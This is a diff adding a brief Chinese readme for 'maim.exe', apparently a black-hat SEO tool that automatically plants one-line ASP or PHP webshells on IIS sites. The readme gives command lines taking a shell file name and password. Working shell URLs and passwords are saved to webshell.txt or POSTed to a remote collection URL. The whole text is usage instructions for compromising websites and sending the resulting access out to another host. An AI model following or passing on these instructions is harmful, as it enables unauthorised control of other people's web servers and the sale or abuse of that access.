@@ -1,0 +1,21 @@
+IIS  网站自动传入一句话    验证
+落雪--SEO  2602159946
+目前只支持 ASP   PHP  2种
+本程序只在2003下测试通过
+
+参数为 maim.exe xxx.php passwod
+一句话测试成功的会保存在程序目录下webshell.txt  里
+一句话地址 | 密码
+http://XXX.com/ar.php|long
+
+参数为 maim.exe xxx.php passwod http://www.xxx.com/webshell.php
+本地不保存数据
+POST远程提交到后台
+
+
+
+程序名称   一句话   一句话密码     远程提交地址
+maim.exe xxx.php passwod
+maim.exe xxx.php passwod http://www.xxx.com/webshell.php
+maim.exe xxx.asp passwod
+maim.exe xxx.asp passwod http://www.xxx.com/webshell.php
